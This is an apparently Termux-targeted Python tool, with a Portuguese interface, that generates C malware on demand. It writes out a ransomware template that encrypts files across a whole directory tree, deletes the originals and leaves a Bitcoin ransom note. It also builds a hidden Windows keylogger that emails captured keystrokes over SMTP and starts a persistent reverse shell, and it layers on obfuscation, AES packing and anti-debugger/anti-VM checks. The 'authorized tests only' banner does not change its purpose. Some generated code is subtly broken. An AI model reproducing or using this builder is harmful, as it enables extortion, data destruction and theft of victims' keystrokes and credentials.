#!/data/data/com.termux/files/usr/bin/python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import random
import base64
import zlib
import platform
import hashlib
import json
from typing import Dict, List, Optional

# Criptografia
try:
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad, unpad
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False

# Interface colorida
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.prompt import Prompt, Confirm, IntPrompt
from rich.progress import Progress
from rich.text import Text
from rich.syntax import Syntax
from rich.markdown import Markdown

console = Console()

class GeradorPayloadsCElite:
    def __init__(self):
        self.payloads = {
            'ransomware': {
                'function': self.gerar_ransomware_c,
                'category': 'Destrutivos',
                'danger_level': 'critical',
                'description': 'Ransomware em C que criptografa arquivos',
                'windows_only': True
            },
            'keylogger': {
                'function': self.gerar_keylogger_c,
                'category': 'Keyloggers',
                'danger_level': 'high',
                'description': 'Keylogger em C para Windows',
                'windows_only': True
            },
            'reverse_shell': {
                'function': self.gerar_reverse_shell_c,
                'category': 'Backdoors',
                'danger_level': 'high',
                'description': 'Reverse Shell em C multiplataforma',
                'windows_only': False
            }
        }
        
        self.tecnicas_ofuscacao = {
            'polimorfico': 'Ofuscação polimórfica',
            'metamorfico': 'Ofuscação metamórfica',
            'criptografar': 'Criptografia AES-256',
            'fragmentado': 'Fragmentação de código',
            'anti_analise': 'Técnicas anti-análise'
        }
        
        self.banners = [
            self._gerar_banner_apocaliptico(),
            self._gerar_banner_matrix(),
            self._gerar_banner_sangue()
        ]
        
        self._verificar_dependencias()
    
    def _gerar_banner_apocaliptico(self) -> str:
        banner = """
[bold red]
 ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄  
▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░▌ 
▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀█░▌
▐░▌          ▐░▌       ▐░▌▐░▌          ▐░▌          ▐░▌       ▐░▌
▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄▄▄ ▐░▌       ▐░▌
▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░▌       ▐░▌
▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀█░█▀▀  ▀▀▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀▀▀ ▐░▌       ▐░▌
▐░▌          ▐░▌     ▐░▌            ▐░▌▐░▌          ▐░▌       ▐░▌
▐░▌          ▐░▌      ▐░▌  ▄▄▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄█░▌
▐░▌          ▐░▌       ▐░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░▌ 
 ▀            ▀         ▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀  
[/bold red]
[bold white on red]    GERADOR DE PAYLOADS C ELITE v7.1 - DARK CODING[/bold white on red]
"""
        return banner
    
    def _gerar_banner_matrix(self) -> str:
        return """
[bold green]
          01010101011011100110001101110010011110010111000001110100011010010110111101101110
          01110100001000000110100001100001011000110110101101101001011011100110011100100000
          01110100011011110110111101101100001110100010000001000111010001010100111001000101
          01010010010000010101010001001111010100100000010011110100011000100000010100000100
          00010100110001001100010000000100111101010011001000000100001101101111011001000110
          10010110111001100111001000000101010001101111011011110110110001110011001000000110
          10010110111001101000011001010111001001101001011101000010000001110100011010000110
          01010010000001100011011011110110010001100101001000000110100101110011001000000110
          11010111010101100011011010000010000001101101011011110111001001100101001000000110
          00110110111101101101011100000110110001101001011000110110000101110100011001010110
          01000010000001110111011010010111010001101000001000000111010001101000011001010010
          00000110001101101111011001000110010100100000011010000110010101110010011001010010
          11100010000000100111001000000100011101100101011011100110010101110010011000010111
          01000110100101101111011011100010000001101111011001100010000001010000011000010111
          10010110110001101111011000010110010001110011001000000100001100100000010001010100
          11000100110001001101010011001010010000000101101001011001010111100101101100011011
          11011001110110011101100101011100100111001100100000010000010101001101010011010001
          01001101010001010011000000110001001100000011000000110001001100000011000100110001
          00110000001100000011000100110001001100010011000000110001001100010011000000110000
          00110000001100010011000100110000001100010011000000110001001100000011000100110001
          00110000001100010011000100110000001100000011000100110000001100010011000100110000
          00110001001100010011000000110000001100010011000000110001001100010011000000110001
          00110001001100000011000000110001001100000011000100110001001100000011000100110001
          00110000001100000011000100110000001100010011000100110000001100010011000100110000
[/bold green]
[bold black on green]    MATRIX PAYLOAD GENERATOR v7.1 - THE ONLY TRUTH IS CODE[/bold black on green]
"""
    
    def _gerar_banner_sangue(self) -> str:
        return """
[bold white on red]
          ▄█████████████████████████████████████████████████████████████████████████▄
          █─▄▄▄▄█▄─▄▄─█─▄▄▄─█▄─▄▄▀██▀▄─██─▄▄▄▄█─▄─▄─█▄─▄█▄─▀█▄─▄█▄─▄▄─█▄─▄▄▀█▄─▄▄─█
          █─██▄─██─▄█▀█─███▀██─▄─▄██─▀─██─██▄─███─████─███─█▄▀─███─▄█▀██─▄─▄██─▄█▀█
          ▀▄▄▄▄▄▀▄▄▄▄▄▀▄▄▄▄▄▀▄▄▀▄▄▀▄▄▀▄▄▀▄▄▄▄▄▀▀▄▄▄▀▀▄▄▄▀▄▄▄▀▀▄▄▀▄▄▄▄▄▀▄▄▀▄▄▀▄▄▄▄▄▀
          ▄█████████████████████████████████████████████████████████████████████████▄
          █─▄▄▄▄█▄─▄▄─█─▄▄▄─█▄─▄▄▀██▀▄─██─▄▄▄▄█─▄─▄─█▄─▄█▄─▀█▄─▄█▄─▄▄─█▄─▄▄▀█▄─▄▄─█
          █─██▄─██─▄█▀█─███▀██─▄─▄██─▀─██─██▄─███─████─███─█▄▀─███─▄█▀██─▄─▄██─▄█▀█
          ▀▄▄▄▄▄▀▄▄▄▄▄▀▄▄▄▄▄▀▄▄▀▄▄▀▄▄▀▄▄▀▄▄▄▄▄▀▀▄▄▄▀▀▄▄▄▀▄▄▄▀▀▄▄▀▄▄▄▄▄▀▄▄▀▄▄▀▄▄▄▄▄▀
[/bold white on red]
[bold white on red]    BLOOD RED PAYLOAD FACTORY v7.1 - WE CODE IN BLOOD[/bold white on red]
"""
    
    def _verificar_dependencias(self):
        required = {
            'Crypto': 'pycryptodomex' if not CRYPTO_AVAILABLE else None,
            'rich': 'rich'
        }
        
        missing = []
        for pkg, install_name in required.items():
            if install_name is None:
                continue
            try:
                __import__(pkg.lower())
            except ImportError:
                missing.append(install_name)
        
        if missing:
            console.print(Panel.fit(
                f"[red]✗ Dependências faltando: {', '.join(missing)}[/red]",
                title="[bold red]ERRO[/bold red]",
                border_style="red"
            ))
            if Confirm.ask("Deseja instalar automaticamente?"):
                with Progress() as progress:
                    task = progress.add_task("[red]Instalando...[/red]", total=len(missing))
                    for pkg in missing:
                        os.system(f"pip install {pkg} --quiet")
                        progress.update(task, advance=1)
                console.print("[green]✓ Dependências instaladas![/green]")
                time.sleep(1)
                
                # Recarrega as dependências criptográficas se necessário
                if 'pycryptodomex' in missing:
                    global CRYPTO_AVAILABLE, AES, pad, unpad
                    try:
                        from Crypto.Cipher import AES
                        from Crypto.Util.Padding import pad, unpad
                        CRYPTO_AVAILABLE = True
                    except ImportError:
                        CRYPTO_AVAILABLE = False
    
    def mostrar_banner(self):
        console.print(random.choice(self.banners))
        console.print(Panel.fit(
            "[blink bold red]⚠️ USO ILEGAL É CRIME! USE APENAS PARA TESTES AUTORIZADOS! ⚠️[/blink bold red]",
            style="red on black"
        ))
        time.sleep(1)
    
    def mostrar_menu_principal(self):
        while True:
            console.clear()
            self.mostrar_banner()
            
            tabela = Table(
                title="[bold cyan]🔧 MENU PRINCIPAL (C LANGUAGE)[/bold cyan]",
                show_header=True,
                header_style="bold magenta"
            )
            tabela.add_column("Opção", style="cyan", width=10)
            tabela.add_column("Payload", style="green")
            tabela.add_column("Perigo", style="red")
            tabela.add_column("Descrição")
            
            for i, (nome, dados) in enumerate(self.payloads.items(), 1):
                perigo = "💀 CRÍTICO" if dados['danger_level'] == 'critical' else "🔥 ALTO"
                tabela.add_row(str(i), nome, perigo, dados['description'])
            
            tabela.add_row("0", "Técnicas", "⚙️", "Opções de ofuscação")
            tabela.add_row("9", "Sair", "🚪", "Encerrar o programa")
            
            console.print(tabela)
            
            escolha = Prompt.ask(
                "[blink yellow]➤[/blink yellow] Selecione",
                choices=[str(i) for i in range(0, len(self.payloads)+1)] + ['9'],
                show_choices=False
            )
            
            if escolha == "1":
                self._processar_payload('ransomware')
            elif escolha == "2":
                self._processar_payload('keylogger')
            elif escolha == "3":
                self._processar_payload('reverse_shell')
            elif escolha == "0":
                self._mostrar_menu_tecnicas()
            elif escolha == "9":
                self._sair()
    
    def _mostrar_menu_tecnicas(self):
        while True:
            console.clear()
            console.print(Panel.fit(
                "[bold cyan]⚙️ TÉCNICAS DE OFUSCAÇÃO[/bold cyan]",
                border_style="cyan"
            ))
            
            tabela = Table(show_header=True, header_style="bold blue")
            tabela.add_column("ID", style="cyan", width=5)
            tabela.add_column("Técnica", style="green")
            tabela.add_column("Descrição")
            
            for i, (codigo, desc) in enumerate(self.tecnicas_ofuscacao.items(), 1):
                tabela.add_row(str(i), desc, self._descricao_tecnica(codigo))
            
            console.print(tabela)
            
            escolha = Prompt.ask(
                "[blink yellow]➤[/blink yellow] Selecione (0 para voltar)",
                choices=[str(i) for i in range(0, len(self.tecnicas_ofuscacao)+1)],
                show_choices=False
            )
            
            if escolha == "0":
                return
    
    def _descricao_tecnica(self, codigo: str) -> str:
        descricoes = {
            'polimorfico': "Altera a estrutura do código a cada compilação",
            'metamorfico': "Muda completamente a aparência do código",
            'criptografar': "Criptografa o payload com AES-256",
            'fragmentado': "Divide o código em partes separadas",
            'anti_analise': "Adiciona verificações anti-debugging"
        }
        return descricoes.get(codigo, "Sem descrição disponível")
    
    def _processar_payload(self, nome_payload: str):
        payload_data = self.payloads[nome_payload]
        
        # Verificar se o payload é específico para Windows
        if payload_data.get('windows_only', False) and platform.system() != "Windows":
            console.print(Panel.fit(
                f"[bold red]AVISO: Este payload é específico para Windows![/bold red]\n"
                f"Você está executando em: {platform.system()}",
                border_style="red"
            ))
            if not Confirm.ask("Continuar mesmo assim?", default=False):
                return
        
        if payload_data['danger_level'] in ['high', 'critical']:
            console.print(Panel.fit(
                "[blink bold red]⚠️ PERIGO ELEVADO ⚠️[/blink bold red]\n"
                "Este payload pode causar danos permanentes ou violar leis.\n"
                "Use apenas em ambientes controlados e com autorização!",
                border_style="red"
            ))
            
            if not Confirm.ask("Confirmar criação?", default=False):
                return
        
        config = self._configurar_payload(nome_payload)
        if config is None:
            return
        
        ofuscar = Confirm.ask("Aplicar técnicas de ofuscação?")
        tecnicas = []
        if ofuscar:
            tecnicas = self._selecionar_tecnicas_ofuscacao()
        
        with Progress() as progress:
            task = progress.add_task("[red]Gerando código C...[/red]", total=100)
            
            payload = payload_data['function'](**config)
            progress.update(task, advance=40)
            
            if ofuscar:
                for tecnica in tecnicas:
                    payload = self._ofuscar_codigo_c(payload, tecnica)
                    progress.update(task, advance=15)
            
            progress.update(task, completed=100)
        
        self._preview_payload(payload, 'c')
        self._salvar_payload(nome_payload, payload)
    
    def _configurar_payload(self, nome_payload: str) -> Optional[Dict]:
        config = {}
        
        if nome_payload == 'ransomware':
            console.print(Panel.fit(
                "[bold red]Configuração do Ransomware[/bold red]",
                border_style="red"
            ))
            config['extensoes'] = Prompt.ask(
                "[yellow]?[/yellow] Extensões (separadas por vírgula)",
                default=".doc,.docx,.xls,.xlsx,.pdf,.jpg,.png,.txt"
            ).split(',')
            config['resgate'] = Prompt.ask(
                "[yellow]?[/yellow] Mensagem de resgate",
                default="Seus arquivos foram criptografados! Pague 0.5 BTC para descriptografar."
            )
            config['email'] = Prompt.ask(
                "[yellow]?[/yellow] E-mail para contato",
                default="pagamento@darknet.com"
            )
            config['diretorio'] = Prompt.ask(
                "[yellow]?[/yellow] Diretório alvo",
                default="/" if platform.system() != "Windows" else "C:\\\\"
            )
        
        elif nome_payload == 'keylogger':
            console.print(Panel.fit(
                "[bold]Configuração do Keylogger[/bold]",
                border_style="blue"
            ))
            config['email'] = Prompt.ask(
                "[yellow]?[/yellow] E-mail para envio dos logs",
                default="hacker@protonmail.com"
            )
            config['intervalo'] = IntPrompt.ask(
                "[yellow]?[/yellow] Intervalo de envio (minutos)",
                default=30
            )
            config['servidor_smtp'] = Prompt.ask(
                "[yellow]?[/yellow] Servidor SMTP",
                default="smtp.protonmail.com"
            )
            config['porta_smtp'] = IntPrompt.ask(
                "[yellow]?[/yellow] Porta SMTP",
                default=587
            )
        
        elif nome_payload == 'reverse_shell':
            console.print(Panel.fit(
                "[bold]Configuração da Reverse Shell[/bold]",
                border_style="green"
            ))
            config['ip'] = Prompt.ask(
                "[yellow]?[/yellow] IP para conexão",
                default="127.0.0.1"
            )
            config['porta'] = IntPrompt.ask(
                "[yellow]?[/yellow] Porta para conexão",
                default=4444
            )
            config['persistente'] = Confirm.ask(
                "[yellow]?[/yellow] Tornar persistente?",
                default=False
            )
        
        console.print("\n[bold]Resumo:[/bold]")
        for chave, valor in config.items():
            console.print(f"  [cyan]{chave}:[/cyan] {valor}")
        
        if not Confirm.ask("Confirmar configurações?"):
            return None
        
        return config
    
    def _selecionar_tecnicas_ofuscacao(self) -> List[str]:
        console.print("\n[bold]Técnicas de Ofuscação:[/bold]")
        tabela = Table(show_header=True, header_style="bold magenta")
        tabela.add_column("ID", style="cyan", width=5)
        tabela.add_column("Técnica", style="green")
        
        for i, (codigo, desc) in enumerate(self.tecnicas_ofuscacao.items(), 1):
            tabela.add_row(str(i), desc)
        
        console.print(tabela)
        
        escolhas = Prompt.ask(
            "[yellow]?[/yellow] Selecione as técnicas (separadas por vírgula)",
            default="1,3,5"
        )
        
        return [list(self.tecnicas_ofuscacao.keys())[int(x)-1] for x in escolhas.split(',')]
    
    def _preview_payload(self, payload: str, language: str = 'c'):
        console.print(Panel.fit(
            "[bold]PRÉ-VISUALIZAÇÃO DO CÓDIGO C[/bold]",
            border_style="yellow"
        ))
        
        lines = payload.split('\n')[:30]
        code = '\n'.join(lines)
        
        console.print(Syntax(code, language, theme="monokai", line_numbers=True))
        
        if len(payload.split('\n')) > 30:
            console.print("[yellow]... (truncado, mostrando apenas as primeiras 30 linhas)[/yellow]")
    
    def _salvar_payload(self, nome_payload: str, payload: str):
        nome_arquivo = Prompt.ask(
            "[yellow]?[/yellow] Nome do arquivo C",
            default=f"payload_{nome_payload}.c"
        )
        
        try:
            with open(nome_arquivo, 'w', encoding='utf-8') as f:
                f.write(payload)
            
            with open(nome_arquivo, 'rb') as f:
                md5 = hashlib.md5(f.read()).hexdigest()
                f.seek(0)
                sha256 = hashlib.sha256(f.read()).hexdigest()
            
            compile_cmd = f"gcc {nome_arquivo} -o {nome_arquivo[:-2]}"
            
            # Adiciona flags específicas para alguns payloads
            if nome_payload == 'ransomware':
                compile_cmd += " -lcrypto -lssl"
            elif nome_payload == 'keylogger':
                if platform.system() == "Windows":
                    compile_cmd += " -lws2_32 -luser32"
            
            console.print(Panel.fit(
                f"[green]✓ Arquivo C salvo como [bold]{nome_arquivo}[/bold][/green]\n"
                f"[cyan]MD5: [bold]{md5}[/bold][/cyan]\n"
                f"[cyan]SHA256: [bold]{sha256}[/bold][/cyan]\n\n"
                f"[yellow]Para compilar:[/yellow]\n"
                f"[white]{compile_cmd}[/white]",
                title="[bold green]SUCESSO[/bold green]",
                border_style="green"
            ))
            
        except Exception as e:
            console.print(Panel.fit(
                f"[red]✗ Erro: {str(e)}[/red]",
                title="[bold red]ERRO[/bold red]",
                border_style="red"
            ))
        
        input("\nPressione Enter para continuar...")
    
    def _ofuscar_codigo_c(self, payload: str, tecnica: str) -> str:
        if tecnica == 'polimorfico':
            return self._ofuscar_polimorfico_c(payload)
        elif tecnica == 'metamorfico':
            return self._ofuscar_metamorfico_c(payload)
        elif tecnica == 'criptografar':
            return self._ofuscar_com_criptografia_c(payload)
        elif tecnica == 'fragmentado':
            return self._ofuscar_fragmentado_c(payload)
        elif tecnica == 'anti_analise':
            return self._adicionar_anti_analise_c(payload)
        return payload
    
    def _ofuscar_polimorfico_c(self, payload: str) -> str:
        # Substitui nomes de variáveis por aleatórios, evitando substituir dentro de strings
        vars = ['i', 'j', 'k', 'x', 'y', 'z', 'a', 'b', 'c', 'count', 'len', 'size']
        new_vars = [f'v{random.randint(100,999)}' for _ in vars]
        
        # Processa o payload linha por linha para evitar substituições em strings
        lines = payload.split('\n')
        for i in range(len(lines)):
            if '"' in lines[i]:  # Pula linhas com strings
                continue
            for old, new in zip(vars, new_vars):
                lines[i] = lines[i].replace(f' {old} ', f' {new} ')
                lines[i] = lines[i].replace(f' {old};', f' {new};')
                lines[i] = lines[i].replace(f'({old})', f'({new})')
                lines[i] = lines[i].replace(f',{old}', f',{new}')
                lines[i] = lines[i].replace(f'={old}', f'={new}')
        
        # Adiciona código morto
        dead_code = [
            f"for(int {random.choice(new_vars)}=0; {random.choice(new_vars)}<{random.randint(5,20)}; {random.choice(new_vars)}++) {{ /* dead code */ }}",
            f"if({random.randint(0,1)}) {{ /* junk */ }} else {{ /* junk */ }}",
            f"#define {''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ', k=6))} {random.randint(100,999)}"
        ]
        
        insert_pos = random.randint(5, len(lines)-5)
        lines.insert(insert_pos, '\n'.join(dead_code))
        
        return '\n'.join(lines)
    
    def _ofuscar_metamorfico_c(self, payload: str) -> str:
        # Transforma estruturas de controle
        payload = payload.replace('for(', 'for (')
        payload = payload.replace('while(', 'while (')
        payload = payload.replace('if(', 'if (')
        payload = payload.replace('switch(', 'switch (')
        
        # Adiciona macros aleatórias
        macros = [
            f"#define {''.join(random.choices('ABCDEFG', k=5))}(x) (x*{random.randint(2,5)})",
            f"#define {''.join(random.choices('HIJKLMN', k=4))}_{random.randint(1,9)} 0x{random.randint(100,999):x}",
            f"#define {''.join(random.choices('OPQRSTU', k=3))}_MASK 0b{random.randint(1,15):04b}"
        ]
        
        # Adiciona funções inúteis
        func_name = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8))
        junk_func = f"""
int {func_name}(int x) {{
    return x ^ {random.randint(1,255)};
}}"""
        
        return '\n'.join(macros) + junk_func + '\n\n' + payload
    
    def _ofuscar_com_criptografia_c(self, payload: str) -> str:
        if not CRYPTO_AVAILABLE:
            console.print("[yellow]Aviso: PyCryptodome não disponível, pulando criptografia[/yellow]")
            return payload
        
        # Criptografa o payload com AES
        key = os.urandom(32)
        iv = os.urandom(16)
        cipher = AES.new(key, AES.MODE_CBC, iv)
        encrypted = cipher.encrypt(pad(payload.encode(), AES.block_size))
        
        # Gera código para descriptografar
        key_str = ', '.join(f'0x{b:02x}' for b in key)
        iv_str = ', '.join(f'0x{b:02x}' for b in iv)
        encrypted_str = ', '.join(f'0x{b:02x}' for b in encrypted)
        
        decrypt_code = f"""
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <openssl/aes.h>

void decrypt_execute() {{
    unsigned char key[] = {{{key_str}}};
    unsigned char iv[] = {{{iv_str}}};
    unsigned char encrypted[] = {{{encrypted_str}}};
    
    AES_KEY aes_key;
    AES_set_decrypt_key(key, 256, &aes_key);
    
    unsigned char decrypted[sizeof(encrypted)];
    AES_cbc_encrypt(encrypted, decrypted, sizeof(encrypted), &aes_key, iv, AES_DECRYPT);
    
    // Remove padding
    int pad = decrypted[sizeof(decrypted)-1];
    decrypted[sizeof(decrypted)-pad] = '\\0';
    
    // Compilar e executar o código descriptografado
    system("echo '");
    system(decrypted);
    system("' > temp.c && gcc temp.c -o temp && ./temp");
}}

int main() {{
    decrypt_execute();
    return 0;
}}
"""
        return decrypt_code
    
    def _ofuscar_fragmentado_c(self, payload: str) -> str:
        # Divide o código em funções separadas
        parts = []
        chunk_size = len(payload) // 5
        for i in range(0, len(payload), chunk_size):
            part = payload[i:i+chunk_size]
            func_name = f"func_{random.randint(1000,9999)}"
            parts.append(f"void {func_name}() {{\n{part}\n}}")
        
        # Embaralha as funções
        random.shuffle(parts)
        
        # Gera código para chamar as funções
        call_code = "int main() {\n"
        for part in parts:
            func_name = part.split(' ')[1].split('(')[0]
            call_code += f"    {func_name}();\n"
        call_code += "    return 0;\n}"
        
        return '\n\n'.join(parts) + '\n\n' + call_code
    
    def _adicionar_anti_analise_c(self, payload: str) -> str:
        anti_code = """
#if defined(_WIN32) || defined(_WIN64)
#include <windows.h>
#endif

#if defined(__linux__) || defined(__unix__)
#include <sys/ptrace.h>
#endif

int IsDebuggerPresent() {
    #if defined(_WIN32) || defined(_WIN64)
    return IsDebuggerPresent();
    #elif defined(__linux__) || defined(__unix__)
    return ptrace(PTRACE_TRACEME, 0, 0, 0) == -1;
    #else
    return 0;
    #endif
}

int IsInsideVM() {
    unsigned int hypervisor_bit = 0;
    #if defined(__x86_64__) || defined(__i386__)
    __asm__ volatile (
        "mov $1, %%eax\n"
        "cpuid\n"
        "bt $31, %%ecx\n"
        "setc %0"
        : "=r" (hypervisor_bit)
        :
        : "%eax", "%ebx", "%ecx", "%edx"
    );
    #endif
    return hypervisor_bit;
}

void AntiAnalysis() {
    if(IsDebuggerPresent() || IsInsideVM()) {
        #if defined(_WIN32) || defined(_WIN64)
        ExitProcess(1);
        #else
        _exit(1);
        #endif
    }
}
"""
        return anti_code + "\n" + payload.replace("int main()", "int main() {\n    AntiAnalysis();")
    
    # Implementações dos payloads em C
    def gerar_ransomware_c(self, extensoes: List[str], resgate: str, email: str, diretorio: str, **kwargs) -> str:
        ext_str = ', '.join(f'"{ext}"' for ext in extensoes)
        dir_slash = '\\\\' if platform.system() == "Windows" else '/'
        
        return f"""#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <openssl/aes.h>
#include <openssl/rand.h>

#define EXTENSIONS {len(extensoes)}
#define CHUNK_SIZE 1024

const char *extensions[EXTENSIONS] = {{{ext_str}}};
const char *ransom_note = "{resgate}\\n\\nContato: {email}";

unsigned char aes_key[32];
unsigned char iv[16];

void generate_key() {{
    if(!RAND_bytes(aes_key, sizeof(aes_key)) {{
        perror("Failed to generate key");
        exit(1);
    }}
    if(!RAND_bytes(iv, sizeof(iv))) {{
        perror("Failed to generate IV");
        exit(1);
    }}
}}

int is_target_file(const char *filename) {{
    const char *ext = strrchr(filename, '.');
    if(!ext) return 0;
    
    for(int i = 0; i < EXTENSIONS; i++) {{
        if(strcmp(ext, extensions[i]) == 0) {{
            return 1;
        }}
    }}
    return 0;
}}

void encrypt_file(const char *filename) {{
    FILE *fp_in = NULL, *fp_out = NULL;
    unsigned char inbuf[CHUNK_SIZE], outbuf[CHUNK_SIZE + AES_BLOCK_SIZE];
    int bytes_read, out_len;
    char out_filename[1024];
    
    AES_KEY enc_key;
    if(AES_set_encrypt_key(aes_key, 256, &enc_key) < 0) {{
        perror("Failed to set encryption key");
        return;
    }}
    
    fp_in = fopen(filename, "rb");
    if(!fp_in) return;
    
    snprintf(out_filename, sizeof(out_filename), "%s.encrypted", filename);
    fp_out = fopen(out_filename, "wb");
    if(!fp_out) {{ fclose(fp_in); return; }}
    
    while((bytes_read = fread(inbuf, 1, CHUNK_SIZE, fp_in)) > 0) {{
        AES_cbc_encrypt(inbuf, outbuf, bytes_read, &enc_key, iv, AES_ENCRYPT);
        fwrite(outbuf, 1, bytes_read + AES_BLOCK_SIZE, fp_out);
    }}
    
    fclose(fp_in);
    fclose(fp_out);
    
    // Remove o arquivo original
    remove(filename);
}}

void process_directory(const char *path) {{
    DIR *dir;
    struct dirent *entry;
    char full_path[4096];
    
    if(!(dir = opendir(path))) return;
    
    while((entry = readdir(dir)) != NULL) {{
        if(strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
            continue;
            
        snprintf(full_path, sizeof(full_path), "%s{dir_slash}%s", path, entry->d_name);
        
        if(entry->d_type == DT_DIR) {{
            process_directory(full_path);
        }} else if(is_target_file(entry->d_name)) {{
            encrypt_file(full_path);
        }}
    }}
    closedir(dir);
}}

void drop_ransom_note() {{
    FILE *fp = fopen("READ_ME.txt", "w");
    if(fp) {{
        fputs(ransom_note, fp);
        fclose(fp);
    }}
}}

int main() {{
    generate_key();
    process_directory("{diretorio}");
    drop_ransom_note();
    return 0;
}}"""
    
    def gerar_keylogger_c(self, email: str, intervalo: int, servidor_smtp: str, porta_smtp: int, **kwargs) -> str:
        return f"""#include <windows.h>
#include <winuser.h>
#include <stdio.h>
#include <time.h>
#include <string.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <ctype.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "user32.lib")

#define INTERVAL ({intervalo} * 60 * 1000)
#define EMAIL "{email}"
#define SMTP_SERVER "{servidor_smtp}"
#define SMTP_PORT {porta_smtp}

HHOOK hHook = NULL;
char log_buffer[4096];
int buffer_pos = 0;

void send_email(const char *data) {{
    WSADATA wsa;
    SOCKET sock;
    struct sockaddr_in server;
    char recv_buffer[4096];
    
    if(WSAStartup(MAKEWORD(2,2), &wsa) != 0) {{
        return;
    }}
    
    if((sock = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {{
        WSACleanup();
        return;
    }}
    
    server.sin_family = AF_INET;
    server.sin_port = htons(SMTP_PORT);
    
    struct hostent *host = gethostbyname(SMTP_SERVER);
    if(host == NULL) {{
        closesocket(sock);
        WSACleanup();
        return;
    }}
    memcpy(&server.sin_addr, host->h_addr_list[0], host->h_length);
    
    if(connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {{
        closesocket(sock);
        WSACleanup();
        return;
    }}
    
    // Recebe a resposta inicial do servidor
    recv(sock, recv_buffer, sizeof(recv_buffer), 0);
    
    // Envia comandos SMTP básicos
    char ehlo[] = "EHLO localhost\\r\\n";
    send(sock, ehlo, strlen(ehlo), 0);
    recv(sock, recv_buffer, sizeof(recv_buffer), 0);
    
    char mail_from[] = "MAIL FROM:<keylogger@local>\\r\\n";
    send(sock, mail_from, strlen(mail_from), 0);
    recv(sock, recv_buffer, sizeof(recv_buffer), 0);
    
    char rcpt_to[256];
    snprintf(rcpt_to, sizeof(rcpt_to), "RCPT TO:<%s>\\r\\n", EMAIL);
    send(sock, rcpt_to, strlen(rcpt_to), 0);
    recv(sock, recv_buffer, sizeof(recv_buffer), 0);
    
    char data_cmd[] = "DATA\\r\\n";
    send(sock, data_cmd, strlen(data_cmd), 0);
    recv(sock, recv_buffer, sizeof(recv_buffer), 0);
    
    // Envia o corpo do email
    char email_data[5120];
    snprintf(email_data, sizeof(email_data),
        "From: keylogger@local\\r\\n"
        "To: %s\\r\\n"
        "Subject: Keylogger Report\\r\\n"
        "\\r\\n"
        "%s\\r\\n"
        ".\\r\\n", EMAIL, data);
    
    send(sock, email_data, strlen(email_data), 0);
    recv(sock, recv_buffer, sizeof(recv_buffer), 0);
    
    char quit[] = "QUIT\\r\\n";
    send(sock, quit, strlen(quit), 0);
    
    closesocket(sock);
    WSACleanup();
}}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {{
    if(nCode >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {{
        KBDLLHOOKSTRUCT *kbd = (KBDLLHOOKSTRUCT *)lParam;
        
        BYTE keyboard_state[256];
        GetKeyboardState(keyboard_state);
        
        WCHAR buffer[16];
        char ascii;
        int result = ToAscii(kbd->vkCode, kbd->scanCode, keyboard_state, (LPWORD)buffer, 0);
        
        if(result == 1) {{
            ascii = (char)buffer[0];
            
            if(kbd->vkCode == VK_RETURN) {{
                strcat(log_buffer, "\\n");
            }} else if(isprint(ascii)) {{
                char str[2] = {{ascii, '\\0'}};
                strcat(log_buffer, str);
            }}
            
            buffer_pos++;
            
            if(buffer_pos >= sizeof(log_buffer) - 1) {{
                send_email(log_buffer);
                buffer_pos = 0;
                memset(log_buffer, 0, sizeof(log_buffer));
            }}
        }}
    }}
    return CallNextHookEx(hHook, nCode, wParam, lParam);
}}

DWORD WINAPI TimerThread(LPVOID lpParam) {{
    while(1) {{
        Sleep(INTERVAL);
        if(buffer_pos > 0) {{
            send_email(log_buffer);
            buffer_pos = 0;
            memset(log_buffer, 0, sizeof(log_buffer));
        }}
    }}
    return 0;
}}

void stealth() {{
    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(stealth, 0);
}}

int main() {{
    stealth();
    
    CreateThread(NULL, 0, TimerThread, NULL, 0, NULL);
    
    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
    if(!hHook) {{
        return 1;
    }}
    
    MSG msg;
    while(GetMessage(&msg, NULL, 0, 0)) {{
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }}
    
    UnhookWindowsHookEx(hHook);
    return 0;
}}"""
    
    def gerar_reverse_shell_c(self, ip: str, porta: int, persistente: bool, **kwargs) -> str:
        persistence_code = """
// Código de persistência para Windows
#ifdef _WIN32
void add_to_startup() {
